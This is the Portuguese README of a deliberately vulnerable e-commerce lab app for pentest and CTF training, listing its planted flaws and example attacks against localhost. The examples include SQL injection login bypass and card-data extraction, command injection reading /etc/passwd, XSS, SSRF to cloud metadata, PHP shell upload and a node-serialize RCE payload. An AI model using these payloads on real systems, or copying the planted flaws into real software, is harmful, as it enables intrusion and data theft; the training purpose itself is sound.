# 🔓 VulnLab Store

> **⚠️ ATENÇÃO: Esta aplicação é DELIBERADAMENTE VULNERÁVEL!**  
> Use apenas em ambientes controlados para estudos de Pentest e AppSec.

Uma aplicação de e-commerce "Vulnerable by Design" para treinamento em segurança da informação (CTF/Wargames).

## 🚀 Quick Start

### Pré-requisitos
- Docker e Docker Compose instalados
- (Opcional) ngrok para exposição externa

### Iniciar a aplicação

```bash
# Clonar/acessar o diretório
cd /path/to/NBlock

# Iniciar containers
docker-compose up --build

# A aplicação estará disponível em:
# http://localhost:3000
```

### Parar a aplicação

```bash
docker-compose down

# Para remover volumes (banco de dados):
docker-compose down -v
```

### Expor via ngrok

```bash
# Em outro terminal:
ngrok http 3000

# Use a URL fornecida pelo ngrok para acesso externo
```

## 🔑 Credenciais de Teste

| Usuário | Senha | Tipo |
|---------|-------|------|
| admin | admin123 | Administrador |
| john | password123 | Usuário comum |
| jane | 123456 | Usuário comum |
| bob | qwerty | Usuário comum |

## 🔓 Vulnerabilidades Implementadas (28 itens)

### 1. Autenticação e Login
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 1 | **Brute Force** - Sem rate limiting | `POST /api/login` |
| 2 | **Enumeração de Usuário** - Mensagens específicas | `POST /api/login` |
| 3 | **Senhas Fracas** - Sem validação de complexidade | `POST /api/register` |

### 2. Gerenciamento de Sessão
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 4 | **Cookie Inseguro** - Sem HttpOnly/Secure/SameSite | Cookie `token` |
| 5 | **JWT Fraco** - Secret "secret123" hardcoded | `server.js` |

### 3. Controle de Acesso
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 6 | **IDOR/BOLA** - Não verifica proprietário do pedido | `GET /api/orders/:id` |
| 7 | **RBAC Quebrado** - isAdmin=true no cookie/query | `GET /api/admin/*` |

### 4. Injection
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 8 | **SQL Injection** - Concatenação de strings | `POST /api/login`, `GET /api/search` |
| 9 | **Command Injection** - exec() sem sanitização | `POST /api/admin/ping` |

### 5. Cross-Site Scripting (XSS)
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 10 | **Reflected XSS** - Termo de busca refletido | `GET /api/search` |
| 11 | **Stored XSS** - Comentários sem sanitização | `POST /api/products/:id/comments` |

### 6-7. CSRF e CORS
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 12 | **CSRF** - Sem token de proteção | `POST /api/users/change-*` |
| 13 | **CORS Permissivo** - Origin: * | Todas as rotas |

### 8-9. Upload e SSRF
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 14 | **Upload Irrestrito** - Aceita .php, .exe, .sh | `POST /api/upload/avatar` |
| 15 | **SSRF** - Sem whitelist de URLs | `POST /api/fetch-image` |

### 10-14. Dados e Criptografia
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 16 | **Desserialização Insegura** - node-serialize | Cookie `preferences` |
| 17 | **Dados em Texto Claro** - CPF/Cartão sem criptografia | Banco de dados |
| 18 | **SSL Opcional** - Aceita HTTP puro | Servidor |
| 19 | **Hash Fraco** - MD5 sem salt | Senhas no banco |
| 20 | **Hardcoded Secrets** - AWS keys no código | `server.js`, frontend |

### 18-22. Logs, Erros e API
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 21 | **Verbose Errors** - Stack trace exposto | Erros 500 |
| 22 | **Log de Senha** - console.log(req.body) | Login |
| 23 | **Sem Rate Limit** - API sem throttling | Todas as rotas |
| 24 | **Mass Assignment** - Retorna todos os campos | `GET /api/users/:id` |

### 28. Lógica de Negócio
| # | Vulnerabilidade | Endpoint/Local |
|---|-----------------|----------------|
| 25 | **Preço Negativo** - Quantidade negativa aceita | `POST /api/cart/checkout` |
| 26 | **Race Condition** - Cupom aplicável múltiplas vezes | `POST /api/cart/checkout` |

## 📝 Exemplos de Exploração

### SQL Injection no Login
```bash
# Bypass de autenticação
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'"'"' OR 1=1 --", "password": "qualquer"}'
```

### SQL Injection na Busca
```bash
# Extrair dados
curl "http://localhost:3000/api/search?q=x' UNION SELECT id,username,password_hash,cpf,credit_card,credit_card_cvv,balance,is_admin::text,'x' FROM users--"
```

### Command Injection
```bash
curl -X POST http://localhost:3000/api/admin/ping \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"ip": "8.8.8.8; cat /etc/passwd"}'
```

### XSS Reflected
```
http://localhost:3000/api/search?q=<script>alert('XSS')</script>
```

### IDOR em Pedidos
```bash
# Acessar pedido de outro usuário
curl http://localhost:3000/api/orders/1 \
  -H "Authorization: Bearer <token_de_outro_usuario>"
```

### SSRF
```bash
curl -X POST http://localhost:3000/api/fetch-image \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

### Bypass de Admin (RBAC)
```bash
curl "http://localhost:3000/api/admin/users?isAdmin=true" \
  -H "Authorization: Bearer <token>"

# Ou via cookie:
curl http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer <token>" \
  -H "Cookie: isAdmin=true"
```

### Quantidade Negativa no Carrinho
```bash
curl -X POST http://localhost:3000/api/cart/checkout \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"items": [{"product_id": 1, "quantity": -5}]}'
```

### Upload de Shell PHP
```bash
curl -X POST http://localhost:3000/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "avatar=@malicious.php"

# Acessar: http://localhost:3000/uploads/<filename>.php
```

### Desserialização node-serialize (RCE)
```javascript
// Payload malicioso para o cookie 'preferences'
const payload = {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('whoami',function(error,stdout,stderr){console.log(stdout)})}()"};
// Encode em base64 e enviar como cookie
```

## 🏗️ Estrutura do Projeto

```
NBlock/
├── docker-compose.yml  # Orquestração dos containers
├── Dockerfile          # Build da aplicação Node.js
├── package.json        # Dependências do projeto
├── server.js           # Servidor Express com vulnerabilidades
├── init.sql            # Script de inicialização do banco
├── uploads/            # Diretório de uploads (vulnerável)
└── README.md           # Este arquivo
```

## 🛡️ Propósito Educacional

Esta aplicação foi criada para:

1. **Estudantes de Segurança** - Praticar identificação e exploração de vulnerabilidades
2. **Desenvolvedores** - Entender como NÃO escrever código
3. **Pentesters** - Treinar técnicas em ambiente controlado
4. **CTF/Wargames** - Desafios de segurança

## ⚠️ Aviso Legal

**NÃO USE ESTE CÓDIGO EM PRODUÇÃO!**

Esta aplicação contém vulnerabilidades graves e intencionais. O uso indevido pode resultar em:
- Comprometimento de sistemas
- Vazamento de dados
- Violação de leis de crimes cibernéticos

Use apenas em ambientes isolados, VMs, ou containers para fins educacionais.

## 📚 Referências

- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

**VulnLab Store** - *Aprenda hackeando (legalmente)!* 🔓
# VulnLab
